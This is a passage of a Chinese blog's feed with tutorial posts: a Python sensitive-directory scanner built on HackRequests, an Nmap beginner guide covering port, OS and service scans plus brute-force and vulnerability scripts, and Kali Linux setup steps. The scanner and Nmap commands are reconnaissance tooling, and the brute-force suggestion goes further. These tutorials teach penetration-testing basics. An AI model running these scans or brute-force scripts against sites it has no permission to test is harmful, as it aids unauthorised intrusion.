class="token punctuation">.</span>move<span class="token punctuation">(</span>year<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>month<span class="token operator">+</span><span class="token string">'-'</span><span class="token operator">+</span>day<span class="token operator">+</span>file<span class="token punctuation">.</span>name<span class="token punctuation">,</span><span class="token string">'backup'</span><span class="token punctuation">)</span></code></pre><p><br><br></p><h2 id="05-实现效果"><a href="#05-实现效果" class="headerlink" title="05 实现效果"></a>05 实现效果<br><br></h2><p>代码执行前：<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200517155210582.png#pic_center" alt=""><br><br>代码执行后：<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200517155223974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200517155237588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 批处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python——实现敏感目录扫描</title>
      <link href="/2020/07/19/python-shi-xian-min-gan-mu-lu-sao-miao/"/>
      <url>/2020/07/19/python-shi-xian-min-gan-mu-lu-sao-miao/</url>
      
        <content type="html"><![CDATA[<h2 id="01-实现背景"><a href="#01-实现背景" class="headerlink" title="01 实现背景"></a>01 实现背景</h2><p>1、PHPdict.txt，一个文本文件，包含可能的敏感目录后缀<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200517131740270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>2、HackRequests模块，安全测试人员专用的类Requests模块<br><br></p><h2 id="02-实现目标"><a href="#02-实现目标" class="headerlink" title="02 实现目标"></a>02 实现目标</h2><p>利用HackRequests模块，配合敏感目录字典PHPdict.txt，实现一个简单的敏感目录扫描Python文件<br><br></p><h2 id="03-注意事项"><a href="#03-注意事项" class="headerlink" title="03 注意事项"></a>03 注意事项</h2><p>1、输入URL时要输全：如 <a href="https://www.baidu.com/、" target="_blank" rel="noopener external nofollow noreferrer">https://www.baidu.com/、</a> <a href="https://www.csdn.net/" target="_blank" rel="noopener external nofollow noreferrer">https://www.csdn.net/</a></p><p>2、为防止网站可能存在的简单反爬机制，我们简单添加headers信息，尝试绕过反爬<br><br><br></p><h2 id="04-实现代码"><a href="#04-实现代码" class="headerlink" title="04 实现代码"></a>04 实现代码</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> HackRequests<span class="token keyword">def</span> <span class="token function">HR</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    h <span class="token operator">=</span> HackRequests<span class="token punctuation">.</span>hackRequests<span class="token punctuation">(</span><span class="token punctuation">)</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">,</span>        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0"</span>    <span class="token punctuation">}</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        u <span class="token operator">=</span> h<span class="token punctuation">.</span>http<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">if</span> u<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s is success!"</span> <span class="token operator">%</span>url<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s is failed! %d"</span> <span class="token operator">%</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>u<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"C:\\Users\\Dell\\Desktop\\Python\\PHPdict.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>    lines <span class="token operator">=</span> file<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    url_begin <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'请输入你要扫描的网站：'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        url <span class="token operator">=</span> f<span class="token string">'{url_begin}{line}'</span>        urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">for</span> url <span class="token keyword">in</span> urls<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    HR<span class="token punctuation">(</span>url<span class="token punctuation">)</span></code></pre><br><h2 id="05-实现效果"><a href="#05-实现效果" class="headerlink" title="05 实现效果"></a>05 实现效果<br><br></h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200517131554381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 敏感目录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap新手入门指南——基础命令详解</title>
      <link href="/2020/07/19/nmap-xin-shou-ru-men-zhi-nan-ji-chu-ming-ling-xiang-jie/"/>
      <url>/2020/07/19/nmap-xin-shou-ru-men-zhi-nan-ji-chu-ming-ling-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p><strong>全篇技术分享纯干货，看完准保你能马上用上Nmap试试手~~</strong></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508152358956.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>本篇文章帮你逐个击破以下3个问题：</p><h2 id="01-Nmap是用来干什么的？"><a href="#01-Nmap是用来干什么的？" class="headerlink" title="01 Nmap是用来干什么的？"></a><strong>01 Nmap是用来干什么的？</strong></h2><h2 id="02-我们能够用Nmap来干什么？"><a href="#02-我们能够用Nmap来干什么？" class="headerlink" title="02 我们能够用Nmap来干什么？"></a><strong>02 我们能够用Nmap来干什么？</strong></h2><h2 id="03-Nmap具体是如何使用的？"><a href="#03-Nmap具体是如何使用的？" class="headerlink" title="03 Nmap具体是如何使用的？"></a><strong>03 Nmap具体是如何使用的？</strong></h2><p>话不多说，我们逐个击破。</p><p><strong>01 Nmap是用来干什么的？</strong></p><p>Nmap是一款扫描神器，通过使用该工具，我们不仅可以知道某个网段存活的主机、存活主机开放着哪些端口以及服务。除此之外，某些时候我们还可以进行目标主机服务器系统版本、操作系统、以及防火墙是否开启的检测。</p><p>也就是说，通过使用Nmap，<strong>IP地址、开放端口、开放服务</strong>等信息都将被你掌握。</p><p><strong>02 我们能够用Nmap来干什么？</strong></p><p>正所谓，知己知彼，百战百胜。我们在信息收集的初期，可以通过Nmap来进行端口的扫描，确定其存在的服务，方便后续渗透对其主机进行针对性的漏洞测试。</p><p>打个比方，就相当于如果你要入室行窃（渗透攻击），那么我们入室之前看看屋子里有哪些地方可以方便进入，是不是有开着什么窗户（端口），开着哪扇门（服务）。这对我们后续动作的进行提供宝贵的参考指标。而这个Nmap就是我们在观察屋子时，使用的望远镜，通过使用这个望远镜，窗户、门口是否开着的情况都被我们牢牢掌握咯。</p><p><strong><strong>03 Nmap具体是如何使用的？</strong></strong></p><p><strong>前情提要：</strong></p><p>我使用的是虚拟机kali上的nmap，<br>kali系统主机IP地址为192.168.131.133<br>本地windows10主机IP地址为192.168.8.105<br>本次实验，仅有以上两台主机存活</p><p><strong>基本的具体使用方法如下:</strong></p><p><strong><em>1）扫描某个具体IP地址    我们重点关注返回的端口信息及服务</em></strong></p><p>在这里，nmap默认发送的是一个ARP的Ping数据包</p><p>如：nmap   192.168.1.100<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508145544804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><strong><em>2）扫描多个IP地址  分别列举</em></strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020050815103026.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p><strong><em>3）扫描某个连续的IP地址   -</em></strong><br>nmap   192.168.1.100-110<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508150446413.png" alt=""><br><strong><em>4）扫描某个网段   加上子网掩码</em></strong><br> nmap   192.168.8.0/24</p><p>但是呢，实际探测的时候采用以上命令扫描非常耗时。所以我们可以添加一些相关参数，达到快速扫描的目的。</p><p> 添加相关参数后，我们的命令为：<br>nmap -sS -Pn  -n –open -T4 –min-hostgroup 4 –min-parallelism 1024 –host-timeout 30  192.168.8.0/24</p><p>简单解释相关参数：<br>-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；</p><p>-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；</p><p>-n： 功能未知；</p><p>–open： 只输出检测状态为open的端口，即开放的端口；</p><p>–min-hostgroup 4：调整并行扫描组的大小；</p><p>–min-parallelism 1024：调整探测报文的并行度；</p><p>-T4：总共有T0-T5，T4折中等级<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508160522832.png" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508160540461.png" alt=""><br>在这里我们看到，IP地址为192.168.8.105的主机存活着。</p><p><strong><em>5）扫描除某个IP外的IP地址  -exclude</em></strong></p><p>nmap -sS -Pn  -n –open -T4 –min-hostgroup 4 –min-parallelism 1024 –host-timeout 30  192.168.8.0/24<br> -exclude 192.168.100.2<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508162152986.png" alt=""><br>在这里，可以看到在添加了-excluede参数后，192.168.8.105端口被排除扫描了，没有被扫描出来</p><p><strong><em>6）扫描某一目标地址的指定端口  -p</em></strong></p><p>nmap   192.168.8.105  -p 21<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508153129251.png" alt=""><br><strong><em>7）扫描目标地址的在线情况  -sP  返回的是存活的IP</em></strong></p><p>nmap  -sP 192.168.8.105<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508170425590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p><strong><em>8）扫描目标地址操作系统版本、服务器版本  -O  -sV</em></strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508162914334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508163225645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><strong><em>9）对目标地址进行路由跟踪  –traceroute</em></strong></p><p>nmap  –traceroute   192.168.8.105<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508163905813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><strong><em>10）扫描文件内的IP地址   -iL</em></strong></p><p>namp -iL  本地文件地址<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508164821868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508164727142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p><strong><em>11）扫描除某一文件中的目标地址之外的目标地址   -excludefile</em></strong></p><p>nmap  192.68.8.100-105   -excludefile   地址<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508165917462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508165945136.png" alt=""><br>在这里，我们发现在ip文本中的192.168.5.108被排除扫描了</p><p><strong>拓展应用</strong>：</p><p>大家可以自行尝试</p><p>1）暴力破解攻击  buute<br>nmap  –script=brute 192.168.8.105</p><p>2）常见漏洞扫描  vuln<br>nmap  –script=vuln 192.168.8.105</p><p>3）探测开启服务  broadcast<br>nmap  –script=broadcast 192.168.8.105</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Nmap </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali  2020 小白使用配置（图文超详细版方案——VMware tools、修改更新源、共享文件夹、无法上网、系统更新）</title>
      <link href="/2020/07/19/kali-2020-xiao-bai-shi-yong-pei-zhi-tu-wen-chao-xiang-xi-ban-fang-an-vmware-tools-xiu-gai-geng-xin-yuan-gong-xiang-wen-jian-jia-wu-fa-shang-wang-xi-tong-geng-xin/"/>
      <url>/2020/07/19/kali-2020-xiao-bai-shi-yong-pei-zhi-tu-wen-chao-xiang-xi-ban-fang-an-vmware-tools-xiu-gai-geng-xin-yuan-gong-xiang-wen-jian-jia-wu-fa-shang-wang-xi-tong-geng-xin/</url>
      
        <content type="html"><![CDATA[<p>如果你是刚刚安装完kali的小白，那么这篇文章保准对你有用<del>~</del></p><p>所谓磨刀不误砍柴工，在你的渗透开始之前，先把你的kali调教的服服帖帖，顺你心意吧<del>~</del></p><p>本文主要详细介绍 kali 安装完成后的基本设置，比如VMware tools工具，修改更新源以及共享文件夹设置等操作。</p><p>读者如果遇到以下个别问题，可直接点击对应蓝色字体跳转哟(＾Ｕ＾)ノ~ＹＯ<br>@<a href="目录">TOC</a></p><p>#</p><h2 id="01-安装VMware-tools工具"><a href="#01-安装VMware-tools工具" class="headerlink" title="01 安装VMware tools工具"></a>01 安装VMware tools工具</h2><p>如果你的物理机上面有一份文档，你想复制到虚拟机上，你会怎么做？<br>你会不会试图把物理机上的文档拖到虚拟机里面试试？<br>但是这样你会发现，是不可以的</p><p>那为了实现这种方便的拖拽，我们需要使用VMware tools 工具，增强虚拟机与物理机的交互性</p><p>除此之外，安装这个工具同时支持自由拖拽、鼠标可在虚拟机 物理机自由移动、虚拟机全屏化的功能</p><p>总之，VMware tools让虚拟机和物理机之间成了好基友。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090458818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>具体操作步骤如下：</p><p><strong>1、在当前非root账号里设定root账号对应的密码</strong></p><pre class=" language-powershell"><code class="language-powershell">sudo passwd root   </code></pre><br><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090512726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><strong>2、切换root用户</strong><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520093013741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520091304103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br><br><strong>3、创建vmtools文件夹，用于存放安装文件</strong></p><pre class=" language-powershell"><code class="language-powershell">mkdir vmtools</code></pre><br><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090546515.png#pic_center" alt=""><br><br><br><strong>4.、在VMware虚拟机软件中，选择安装“VMware Tools</strong><br>”<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090600400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><strong>5、桌面上双击”VMware Tools”图标，查看安装文件名并复制</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090630463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><strong>6、将安装文件复制到刚刚创建的vmtools目录中</strong></p><pre class=" language-powershell"><code class="language-powershell">root@kali:<span class="token operator">/</span>media<span class="token operator">/</span>cdrom0<span class="token comment" spellcheck="true"># cp VMwareTools-10.3.10-13959562.tar.gz  /root/vmtools</span></code></pre><br>**7、切换到vmtools目录，使用tar -zxvf参数解压缩tar.gz文件**<pre class=" language-powershell"><code class="language-powershell">root@kali:~<span class="token operator">/</span>vmtools<span class="token comment" spellcheck="true"># tar -zxvf VMwareTools-10.3.10-13959562.tar.gz&lt;br></span></code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090645420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><strong>8、在vmtools目录下切换到vmware-tools-distrib，找到安装文件并复制文件名</strong></p><pre class=" language-powershell"><code class="language-powershell"> root@kali:~<span class="token operator">/</span>vmtools<span class="token comment" spellcheck="true"># cd vmware-tools-distrib  </span></code></pre><p><br><strong>9、运行安装文件</strong></p><pre class=" language-powershell"><code class="language-powershell">`root@kali:~<span class="token operator">/</span>vmtools<span class="token operator">/</span>vmware<span class="token operator">-</span>tools<span class="token operator">-</span>distrib<span class="token comment" spellcheck="true"># ./vmware-install.pl   //运行安装文件` </span></code></pre><br><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090708337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><strong>10、安装完毕后，重新启动Kali Linux</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090718719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h2 id="02-ifconfig等命令失效问题"><a href="#02-ifconfig等命令失效问题" class="headerlink" title="02 ifconfig等命令失效问题"></a>02 ifconfig等命令失效问题</h2><p> 出现这种情况，可能有两种原因，我们分别来看看怎么解决：</p><p>1、KALI Linux 2020.1b版本默认未安装net-tools工具包，所以我们手动安装net-tools工具包</p><pre class=" language-powershell"><code class="language-powershell">sudo apt<span class="token operator">-</span>get install net<span class="token operator">-</span>tools    </code></pre><br><p>2、2020.1b版本默认登录不是root用户所以加上sudo，借用部分root权限</p><pre class=" language-powershell"><code class="language-powershell">sudo ifconfig      </code></pre><p><br><br><br></p><h2 id="03-无法上网的解决方案"><a href="#03-无法上网的解决方案" class="headerlink" title="03 无法上网的解决方案"></a>03 无法上网的解决方案</h2><p><strong>1、打开网卡配置文件</strong></p><pre class=" language-powershell"><code class="language-powershell">leafpad <span class="token operator">/</span>etc<span class="token operator">/</span>network<span class="token operator">/</span>interfaces       </code></pre><p><strong>2、添加eth0网卡信息</strong>（参照loopback接口补充如下信息）</p><pre class=" language-powershell"><code class="language-powershell">auto eth0                            iface eth0 inet dhcp         </code></pre><p><strong>3、重启网卡</strong></p><pre class=" language-powershell"><code class="language-powershell"><span class="token operator">/</span>etc<span class="token operator">/</span>init<span class="token punctuation">.</span>d<span class="token operator">/</span>networking restart    </code></pre><p><br><br><br></p><h2 id="04-修改更新源问题"><a href="#04-修改更新源问题" class="headerlink" title="04 修改更新源问题"></a>04 修改更新源问题</h2><p>我们知道，一般情况下kali的更新过程是通过kali美国的服务器下载。但是国外更新源下载实在太慢，我们换国内的，离我们近的，下载快！</p><p>我们可以将更新源改为国内的更新源（清华大学、浙江大学、中科大、阿里云、网易、东软学院……）来提高下载速度。</p><p>具体操作步骤如下：</p><p><strong>1、打开更新源文件</strong></p><pre class=" language-powershell"><code class="language-powershell">sudo Leafpad  <span class="token operator">/</span>etc<span class="token operator">/</span>apt<span class="token operator">/</span>sources<span class="token punctuation">.</span>list</code></pre><p><strong>2、添加国内更新源地址，同时注释掉国外默认更新地址</strong></p><pre class=" language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true">#清华大学 [更新源]</span>deb http:<span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>tuna<span class="token punctuation">.</span>tsinghua<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main contrib non<span class="token operator">-</span>freedeb<span class="token operator">-</span>src https:<span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>tuna<span class="token punctuation">.</span>tsinghua<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main contrib non<span class="token operator">-</span>free</code></pre><pre class=" language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true">#浙江大学[更新源]</span>deb http:<span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>zju<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main contrib non<span class="token operator">-</span>freedeb<span class="token operator">-</span>src http:<span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>zju<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main contrib non<span class="token operator">-</span>free</code></pre><p><br><br><br></p><h2 id="05-软件、系统更新问题"><a href="#05-软件、系统更新问题" class="headerlink" title="05 软件、系统更新问题"></a>05 软件、系统更新问题</h2><p>通常情况下，使用最新的软件和系统，能够让我体会到更人性化的渗透费油。</p><p>使用命令更新系统和软件</p><pre class=" language-powershell"><code class="language-powershell">1、apt<span class="token operator">-</span>get update        <span class="token operator">/</span><span class="token operator">/</span>更新软件包的索引文件，速度快2、apt<span class="token operator">-</span>get upgrade         <span class="token operator">/</span><span class="token operator">/</span>更新软件包，速度慢3、apt<span class="token operator">-</span>get dist<span class="token operator">-</span>upgrade   <span class="token operator">/</span><span class="token operator">/</span>更新Kali Linux或Debian Linux版本4、apt<span class="token operator">-</span>get clean    <span class="token operator">/</span><span class="token operator">/</span>清除缓存，将已安装的软件包的安装文件删除</code></pre><p><strong>我们可以定期循环执行以上命令，以保证软件的最新版本。在这一点上，喜新厌旧是正确的。</strong><br><br><br><br></p><h2 id="06-共享文件夹设置问题"><a href="#06-共享文件夹设置问题" class="headerlink" title="06 共享文件夹设置问题"></a>06 共享文件夹设置问题</h2><p>说实话，老是用鼠标在物理机、虚拟机之间拖拽文件，一两个文件还好说，多了你受得住吗？<br>所以我们设置一个共享文件，方便虚拟机和物理机直接的互通。在这个共享文件里，虚拟机文件系统看得到，物理机文件系统看得到，真的不要太方便！</p><p>具体操作步骤如下：</p><p><strong>1、在VMware虚拟机软件中指定物理机的某个文件夹作为共享文件夹</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090739591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><strong>2、在Kali Linux系统的设置中启动共享文件夹功能</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090751211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><strong>3、在Kali Linux系统打开共享文件夹</strong></p><pre class=" language-powershell"><code class="language-powershell"><span class="token operator">/</span>mnt<span class="token operator">/</span>hgfs<span class="token operator">/</span>Shared Virtual Machines<span class="token operator">/</span>    </code></pre><br><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200520090805408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br></p><p><strong>好啦，经过了以上6个步骤的磨炼，你的kali之旅会顺畅许多啦~~</strong></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> Kali </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github博客+腾讯云域名的快捷绑定方案</title>
      <link href="/2020/07/19/github-bo-ke-teng-xun-yun-yu-ming-de-kuai-jie-bang-ding-fang-an/"/>
      <url>/2020/07/19/github-bo-ke-teng-xun-yun-yu-ming-de-kuai-jie-bang-ding-fang-an/</url>
      
